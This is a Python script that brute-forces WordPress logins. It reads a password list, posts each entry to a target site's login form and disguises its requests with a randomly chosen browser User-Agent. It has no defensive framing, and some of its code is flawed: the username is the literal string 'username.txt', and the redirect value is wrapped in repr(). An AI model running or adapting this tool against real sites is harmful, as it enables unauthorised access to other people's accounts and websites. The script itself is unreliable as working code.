import requests
import random

wp_login_url = input("enter the site wp url: ")

username = "username.txt"

password_file = input("enter the password list .txt path: ")#r"C:\Users\....."

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/116.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/537.36"
]

# Randomly select a User-Agent from the list
random_user_agent = random.choice(user_agents)

randheaders = {
    "User-Agent": random_user_agent
}

def brute_force():
    with open(password_file, "r") as file:
        for password in file:
            password = password.strip()
            print(f"[*] Trying password: {password}")

            payload = {
                "log": username,  # 'log' is the input name for username in WordPress
                "pwd": password,  # 'pwd' is the input name for password in WordPress
                "wp-submit": "Log In",
                "redirect_to": repr(wp_login_url),
                "testcookie": "1"
            }

            response = requests.post(wp_login_url, data=payload, headers=randheaders)

            if "wp-admin" in response.url:
                print(f"[+] Password found: {password}")
                break
        else:
            print("[-] Password not found in the dictionary.")

if __name__ == "__main__":
    brute_force()